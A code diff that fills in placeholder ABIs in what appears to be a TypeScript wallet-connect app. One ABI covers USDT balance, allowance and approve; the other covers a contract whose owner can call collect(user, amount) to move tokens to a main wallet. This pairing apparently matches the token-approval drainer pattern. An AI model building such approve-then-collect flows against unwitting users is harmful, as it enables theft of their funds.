@@ -16,8 +16,33 @@ const NETWORK_CONFIG = {
 const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
 
 // ── ABIs ──
-const USDT_ABI = [ /* your full USDT_ABI here */ ]
-const COLLECT_ABI = [ /* your full COLLECT_ABI here */ ]
+const USDT_ABI = [
+  { constant: true,  inputs: [{ name: "who", type: "address" }],
+    name: "balanceOf", outputs: [{ name: "", type: "uint256" }], type: "function" },
+  { constant: true,
+    inputs: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }],
+    name: "allowance", outputs: [{ name: "", type: "uint256" }], type: "function" },
+  { constant: false,
+    inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }],
+    name: "approve", outputs: [{ name: "", type: "bool" }], type: "function" },
+];
+const COLLECT_ABI = [
+  { constant: true,  inputs: [], name: "mainWallet",
+    outputs: [{ name: "", type: "address" }], stateMutability: "view", type: "function" },
+  { constant: true,  inputs: [], name: "usdt",
+    outputs: [{ name: "", type: "address" }], stateMutability: "view", type: "function" },
+  { constant: false,
+    inputs: [{ name: "user", type: "address" }, { name: "amount", type: "uint256" }],
+    name: "collect", outputs: [], stateMutability: "nonpayable", type: "function" },
+  { constant: true,  inputs: [], name: "owner",
+    outputs: [{ name: "", type: "address" }], stateMutability: "view", type: "function" },
+  { inputs: [{ name: "_usdt", type: "address" }, { name: "_mainWallet", type: "address" }],
+    stateMutability: "nonpayable", type: "constructor" },
+  { anonymous: false,
+    inputs: [{ indexed: false, name: "from", type: "address" },
+             { indexed: false, name: "amount", type: "uint256" }],
+    name: "Collected", type: "event" },
+];
 
 // Wallet icons fallback
 const WALLET_ICONS: Record<string, string> = {
